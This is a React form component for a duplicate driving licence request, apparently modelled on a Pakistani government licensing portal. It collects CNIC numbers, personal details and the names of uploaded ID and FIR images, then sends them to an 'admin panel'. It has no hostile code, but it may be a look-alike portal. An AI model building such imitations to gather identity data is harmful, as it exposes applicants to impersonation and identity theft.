import { useState, type FormEvent } from "react";
import { saveRequest } from "@/components/dlims/store";

const FIELDS = [
  ["name", "Name*"],
  ["father", "Father/Husband Name*"],
  ["dob", "Date of Birth*"],
  ["phone", "Phone Number*"],
  ["emergency", "Emergency Contact Number*"],
  ["email", "Email*"],
  ["address", "Address*"],
] as const;

export function DuplicateForm({ onBack }: { onBack: () => void }) {
  const [done, setDone] = useState(false);
  const [files, setFiles] = useState<Record<string, string>>({});

  function onSubmit(event: FormEvent<HTMLFormElement>) {
    event.preventDefault();
    const form = event.currentTarget;
    const data = new FormData(form);
    const box = form.querySelector<HTMLInputElement>('input[name="certify"]');
    if (!box?.checked) return;
    const name = String(data.get("name") || "").trim();
    const cnic = String(data.get("cnic") || "").replace(/\D/g, "");
    if (cnic.length < 11 || !name) return;
    const uploads = Object.entries(files)
      .filter(([, value]) => value)
      .map(([key, value]) => `${key}: ${value}`)
      .join(", ");
    void saveRequest({
      category: "regular",
      name: name.toUpperCase(),
      father: String(data.get("father") || "").trim().toUpperCase(),
      cnic,
      dob: String(data.get("dob") || "").trim(),
      phone: String(data.get("phone") || "").trim(),
      email: String(data.get("email") || "").trim(),
      district: "FAISALABAD",
      address: [String(data.get("address") || "").trim(), uploads].filter(Boolean).join(" · "),
      licenseNo: "DUPLICATE",
      vehicle: "DUPLICATE",
    })
      .then(() => setDone(true))
      .catch(() => setDone(false));
  }

  return (
    <div className="mx-auto max-w-md overflow-hidden rounded-3xl bg-white shadow-sm">
      <div className="flex items-center gap-3 bg-leaf px-3 py-3 text-white">
        <button type="button" onClick={onBack} className="grid size-9 place-items-center text-xl" aria-label="Back">
          ←
        </button>
        <p className="font-bold">Duplicate Driving License</p>
      </div>
      <form onSubmit={onSubmit} className="space-y-3 px-4 py-4">
        <p className="text-sm font-semibold text-ink/70">Step 2</p>
        <div className="h-2 overflow-hidden rounded-full bg-[#e6e6e6]">
          <div className="h-full w-2/3 rounded-full bg-[#3dbe63]" />
        </div>
        <h1 className="text-xl font-black text-[#1a3f8b]">Personal Details</h1>
        <p className="-mt-2 text-sm text-ink/60">Enter personal details of the applicant</p>
        {FIELDS.map(([name, label]) => (
          <label key={name} className="block">
            <span className="mb-1 block text-xs text-ink/50">{label}</span>
            <input
              name={name}
              required
              type={name === "dob" ? "date" : "text"}
              min={name === "dob" ? "1940-01-01" : undefined}
              max={name === "dob" ? "2012-12-31" : undefined}
              className="w-full rounded-lg border border-line px-3 py-3 text-sm font-semibold"
            />
          </label>
        ))}
        <label className="block">
          <span className="mb-1 block text-xs text-ink/50">Nationality*</span>
          <select defaultValue="Pakistani" className="w-full rounded-lg border border-line px-3 py-3 text-sm font-semibold">
            <option>Pakistani</option>
          </select>
        </label>
        <label className="block">
          <span className="mb-1 block text-xs text-ink/50">Height*</span>
          <select defaultValue="5.7" className="w-full rounded-lg border border-line px-3 py-3 text-sm font-semibold">
            <option>5.7</option>
            <option>5.6</option>
            <option>5.8</option>
          </select>
        </label>
        <label className="block">
          <span className="mb-1 block text-xs text-ink/50">Citizen Type*</span>
          <select defaultValue="CIVILIAN" className="w-full rounded-lg border border-line px-3 py-3 text-sm font-semibold">
            <option>CIVILIAN</option>
          </select>
        </label>
        <label className="block">
          <span className="mb-1 block text-xs text-ink/50">Blood Group*</span>
          <select defaultValue="O+" className="w-full rounded-lg border border-line px-3 py-3 text-sm font-semibold">
            <option>O+</option>
            <option>A+</option>
            <option>B+</option>
          </select>
        </label>
        <label className="block">
          <span className="mb-1 block text-xs text-ink/50">CNIC*</span>
          <input name="cnic" required inputMode="numeric" className="w-full rounded-lg border border-line px-3 py-3 text-sm font-semibold" />
        </label>
        <p className="pt-2 text-base font-black">Current Address</p>
        <label className="block">
          <span className="mb-1 block text-xs text-ink/50">District*</span>
          <select defaultValue="FAISALABAD" className="w-full rounded-lg border border-line px-3 py-3 text-sm font-semibold">
            <option>FAISALABAD</option>
            <option>LAHORE</option>
          </select>
        </label>
        <p className="pt-2 text-base font-black">License Allowed Vehicle(s) Type</p>
        <label className="flex items-center gap-2 text-sm font-semibold">
          <input type="checkbox" defaultChecked className="size-4 accent-leaf" /> M/CYCLE
        </label>
        <label className="flex items-center gap-2 text-sm font-semibold">
          <input type="checkbox" defaultChecked className="size-4 accent-leaf" /> LTV
        </label>
        {[
          ["photo", "Upload Photo*", "Passport-size photo on a white background. 500kb max."],
          ["cnicf", "Upload CNIC Front*", "Upload front CNIC and size should be only 500kb max."],
          ["cnicb", "Upload CNIC Back*", "Upload back CNIC and size should be only 500kb max."],
          ["licf", "Upload Licence Front*", "Upload the front of the driving licence. 500kb max."],
          ["licb", "Upload Licence Back*", "Upload the back of the driving licence. 500kb max."],
          ["fir", "Upload Lost Complaint / FIR*", "Upload Lost Complaint / FIR and size should be only 500kb max."],
          ["med", "Upload Medical Certificate*", "Upload medical certificate and size should be only 500kb max."],
        ].map(([key, title, hint]) => (
          <div key={key}>
            <div className="mb-1 flex items-center justify-between">
              <p className="font-black">{title}</p>
              <span className="rounded-md bg-pink-50 px-2 py-1 text-xs text-pink-500">View Guidelines</span>
            </div>
            <label className="grid h-36 cursor-pointer place-items-center rounded-xl border border-dashed border-line text-center text-ink/50">
              <input
                type="file"
                accept="image/*"
                className="sr-only"
                onChange={(event) => {
                  const file = event.target.files?.[0];
                  setFiles((prev) => ({ ...prev, [key]: file ? file.name : "" }));
                }}
              />
              <span>
                <span className="block text-3xl">🖼️</span>
                {files[key] || "Upload here"}
              </span>
            </label>
            <p className="mt-1 text-xs text-[#e0a020]">ⓘ {hint}</p>
          </div>
        ))}
        <label className="flex items-start gap-2 text-sm">
          <input name="certify" type="checkbox" required className="mt-1 size-4 accent-leaf" />
          <span>I hereby certify that the information provided by me is correct and I will be liable for legal action, if found false or forged.</span>
        </label>
        <button type="submit" className="w-full rounded-full bg-leaf py-3 font-bold text-white">
          Next
        </button>
        {done ? <p className="rounded-lg bg-leaf-soft px-3 py-2 text-sm font-semibold text-leaf">Request sent to the admin panel.</p> : null}
      </form>
    </div>
  );
}
